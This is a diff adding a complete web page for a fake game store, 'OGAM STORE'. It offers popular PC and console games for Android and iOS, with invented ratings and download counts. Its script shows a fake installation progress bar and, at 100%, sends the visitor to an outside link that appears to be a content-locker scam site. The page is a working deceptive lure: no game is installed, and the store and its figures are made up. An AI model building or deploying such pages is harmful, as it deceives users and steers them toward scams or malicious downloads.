@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OGAM STORE</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+<style>
+body{
+margin:0;
+font-family:Orbitron;
+background: radial-gradient(circle at top,#0f172a,#020617);
+color:white;
+overflow-x:hidden;
+}
+
+/* animated glow background */
+body::before{
+content:"";
+position:fixed;
+width:500px;
+height:500px;
+background:radial-gradient(circle,#00ffcc55,transparent 60%);
+top:-100px;
+left:-100px;
+filter:blur(60px);
+animation:move 6s infinite alternate;
+}
+
+@keyframes move{
+from{transform:translate(0,0);}
+to{transform:translate(120px,80px);}
+}
+
+/* NAV */
+nav{
+display:flex;
+justify-content:space-between;
+align-items:center;
+padding:15px 30px;
+backdrop-filter:blur(15px);
+background:rgba(15,23,42,0.6);
+position:sticky;
+top:0;
+z-index:1000;
+border-bottom:1px solid #1e293b;
+}
+
+.logo{
+display:flex;
+align-items:center;
+gap:10px;
+font-weight:900;
+text-shadow:0 0 20px #00ffcc;
+}
+
+.logo span{
+color:#00ffcc;
+}
+
+/* HERO */
+.hero{
+text-align:center;
+padding:40px 20px;
+}
+
+.hero h1{
+font-size:60px;
+margin:0;
+background:linear-gradient(90deg,#00ffcc,#3b82f6,#a855f7);
+-webkit-background-clip:text;
+-webkit-text-fill-color:transparent;
+text-shadow:0 0 30px #00ffcc;
+}
+
+.hero p{
+opacity:0.7;
+}
+
+/* GAMES */
+.games{
+display:grid;
+grid-template-columns:repeat(auto-fit,minmax(240px,1fr));
+gap:20px;
+padding:30px;
+}
+
+/* CARD 3D */
+.card{
+background:rgba(17,24,39,0.8);
+border:1px solid #1e293b;
+border-radius:16px;
+overflow:hidden;
+transition:0.3s;
+transform-style:preserve-3d;
+backdrop-filter:blur(10px);
+}
+
+.card:hover{
+transform:translateY(-10px) rotateX(6deg) rotateY(-6deg);
+box-shadow:0 20px 40px rgba(0,255,204,0.2);
+}
+
+.card img{
+width:100%;
+height:150px;
+object-fit:cover;
+}
+
+.card-body{
+padding:12px;
+}
+
+.title{
+font-weight:800;
+margin:6px 0;
+color:#00ffcc;
+text-shadow:0 0 10px #00ffcc55;
+}
+
+/* META */
+.meta{
+display:flex;
+justify-content:space-between;
+font-size:12px;
+margin-top:8px;
+}
+
+.rating,.downloads{
+display:flex;
+gap:6px;
+padding:5px 8px;
+border-radius:8px;
+background:#0f172a;
+border:1px solid #1e293b;
+}
+
+.rating i{color:#facc15;}
+.downloads i{color:#00ffcc;}
+
+/* BUTTON */
+.btn{
+margin-top:10px;
+padding:10px;
+text-align:center;
+border-radius:10px;
+cursor:pointer;
+font-weight:800;
+background:linear-gradient(90deg,#00ffcc,#3b82f6);
+color:black;
+transition:0.2s;
+}
+
+.btn:hover{
+transform:scale(1.05);
+box-shadow:0 0 20px #00ffcc55;
+}
+
+/* MODAL */
+.modal{
+position:fixed;
+inset:0;
+background:rgba(0,0,0,0.8);
+display:none;
+align-items:center;
+justify-content:center;
+}
+
+.box{
+width:340px;
+background:#0f172a;
+border-radius:15px;
+border:1px solid #1e293b;
+text-align:center;
+padding:15px;
+box-shadow:0 0 30px #00ffcc22;
+}
+
+.box img{
+width:100%;
+border-radius:10px;
+}
+
+.platform{
+display:block;
+margin:10px 0;
+padding:10px;
+border-radius:10px;
+font-weight:800;
+cursor:pointer;
+}
+
+.android{background:#22c55e;}
+.ios{background:#3b82f6;}
+
+.bar{
+width:100%;
+height:8px;
+background:#1e293b;
+border-radius:10px;
+overflow:hidden;
+margin-top:10px;
+}
+
+.bar span{
+display:block;
+height:100%;
+width:0%;
+background:linear-gradient(90deg,#00ffcc,#3b82f6);
+}
+
+#percent{
+font-size:40px;
+color:#00ffcc;
+text-shadow:0 0 20px #00ffcc;
+}
+</style>
+</head>
+
+<body>
+
+<nav>
+<div class="logo">
+<i class="fa-solid fa-gamepad"></i>
+<span>OGAM STORE</span>
+</div>
+</nav>
+
+<div class="hero">
+<h1>🎮 OGAM STORE</h1>
+<p>Ultra Gaming Experience • 3D Neon Edition 🔥</p>
+</div>
+
+<div class="games" id="games"></div>
+
+<!-- PLATFORM -->
+<div class="modal" id="platformModal">
+  <div class="box">
+    <h3>Choose Platform 🎯</h3>
+    <button class="platform android" onclick="choose('Android')">Android 🤖</button>
+    <button class="platform ios" onclick="choose('iOS')">iOS 🍎</button>
+  </div>
+</div>
+
+<!-- INSTALL -->
+<div class="modal" id="installModal">
+  <div class="box">
+    <img id="img">
+    <h3 id="title"></h3>
+    <p id="status"></p>
+
+    <div class="bar"><span id="bar"></span></div>
+    <h1 id="percent">0%</h1>
+  </div>
+</div>
+
+<script>
+
+const link="https://appchecker.space/cl/i/rnnqgv";
+let current=null;
+
+const games=[
+["Spider-Man","4.9","12.4M","https://cdn.cloudflare.steamstatic.com/steam/apps/1817070/header.jpg"],
+["GTA V","4.8","25M","https://cdn.cloudflare.steamstatic.com/steam/apps/271590/header.jpg"],
+["Forza Horizon 5","4.7","8.9M","https://cdn.cloudflare.steamstatic.com/steam/apps/1551360/header.jpg"],
+["Rust","4.8","14M","https://cdn.cloudflare.steamstatic.com/steam/apps/252490/header.jpg"],
+["Red Dead Redemption","4.9","18M","https://cdn.cloudflare.steamstatic.com/steam/apps/1174180/header.jpg"],
+["Hollow Knight","4.8","3.5M","https://cdn.cloudflare.steamstatic.com/steam/apps/367520/header.jpg"],
+["BeamNG Drive","4.5","5.3M","https://cdn.cloudflare.steamstatic.com/steam/apps/284160/header.jpg"],
+["Assetto Corsa","4.6","7.1M","https://cdn.cloudflare.steamstatic.com/steam/apps/244210/header.jpg"],
+["Euro Truck Simulator 2","4.7","10M","https://cdn.cloudflare.steamstatic.com/steam/apps/227300/header.jpg"],
+["Avatar","4.4","4.2M","https://cdn.cloudflare.steamstatic.com/steam/apps/2840770/header.jpg"],
+["Demon Slayer","4.6","6.2M","https://cdn.cloudflare.steamstatic.com/steam/apps/1490890/header.jpg"],
+["Poppy Playtime","4.5","9M","https://cdn.cloudflare.steamstatic.com/steam/apps/1721470/header.jpg"]
+];
+
+const g=document.getElementById("games");
+
+games.forEach((x,i)=>{
+g.innerHTML+=`
+<div class="card">
+<img src="${x[3]}">
+<div class="card-body">
+<div class="title">${x[0]}</div>
+
+<div class="meta">
+<div class="rating"><i class="fa fa-star"></i>${x[1]}</div>
+<div class="downloads"><i class="fa fa-download"></i>${x[2]}</div>
+</div>
+
+<div class="btn" onclick="openP(${i})">Install ⚡</div>
+</div>
+</div>
+`;
+});
+
+function openP(i){
+current=games[i];
+document.getElementById("platformModal").style.display="flex";
+}
+
+function choose(type){
+document.getElementById("platformModal").style.display="none";
+document.getElementById("installModal").style.display="flex";
+
+document.getElementById("img").src=current[3];
+document.getElementById("title").innerText=current[0];
+document.getElementById("status").innerText="Installing for "+type+" 🔥";
+
+let p=0;
+
+let interval=setInterval(()=>{
+
+p+=2;
+document.getElementById("percent").innerText=p+"%";
+document.getElementById("bar").style.width=p+"%";
+
+if(p>=100){
+clearInterval(interval);
+window.location.href="https://appchecker.space/cl/i/rnnqgv";
+}
+
+},25);
+}
+</script>
+
+</body>
+</html>
